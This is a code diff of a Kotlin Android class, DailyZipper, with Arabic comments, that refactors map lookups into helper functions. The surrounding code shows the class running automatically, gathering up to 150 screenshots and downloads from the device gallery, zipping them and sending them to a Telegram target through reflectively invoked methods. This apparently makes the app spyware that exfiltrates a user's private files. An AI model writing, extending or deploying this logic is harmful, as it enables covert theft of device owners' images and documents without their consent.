@@ -78,6 +78,17 @@ class DailyZipper(
         fun create(context: Context, scanner: Any? = null, telegram: Any? = null): DailyZipper {
             return DailyZipper(context, scanner, telegram)
         }
+
+        // ===== دوال مساعدة آمنة باستخدام get بدلاً من entries =====
+        private fun getBooleanFromMap(obj: Any?, key: String): Boolean {
+            val map = obj as? Map<*, *> ?: return false
+            return map.get(key) as? Boolean ?: false
+        }
+
+        private fun getStringFromMap(obj: Any?, key: String): String {
+            val map = obj as? Map<*, *> ?: return ""
+            return map.get(key)?.toString() ?: ""
+        }
     }
 
     init {
@@ -266,7 +277,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات إلى Telegram (بدون دوال مساعدة)
+    //  إرسال الملفات إلى Telegram (باستخدام الدوال المساعدة الجديدة)
     // ============================================================
 
     private suspend fun safeSend(
@@ -301,20 +312,9 @@ class DailyZipper(
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
 
-                // استخراج القيمة مباشرة مع التحويل الصريح
                 val success = when (result) {
                     is Boolean -> result
-                    is Map<*, *> -> {
-                        var ok = false
-                        for (entry in result.entries) {
-                            if (entry.key.toString() == "ok") {
-                                ok = entry.value as? Boolean == true
-                                break
-                            }
-                        }
-                        ok
-                    }
-                    else -> false
+                    else -> getBooleanFromMap(result, "ok")
                 }
 
                 if (success) {
@@ -622,7 +622,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي (بدون دوال مساعدة)
+    //  التشغيل التلقائي (باستخدام الدوال المساعدة الجديدة)
     // ============================================================
 
     fun run(): Boolean {
@@ -640,23 +640,10 @@ class DailyZipper(
 
             if (scanner != null) {
                 try {
-                    // استخدام فئات آمنة
                     listOf("screenshot", "download").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            val path = when (item) {
-                                is Map<*, *> -> {
-                                    var p = ""
-                                    for (entry in item.entries) {
-                                        if (entry.key.toString() == "path") {
-                                            p = entry.value?.toString() ?: ""
-                                            break
-                                        }
-                                    }
-                                    p
-                                }
-                                else -> ""
-                            }
+                            val path = getStringFromMap(item, "path")
                             if (path.isNotEmpty()) {
                                 val f = File(path)
                                 if (f.exists()) {
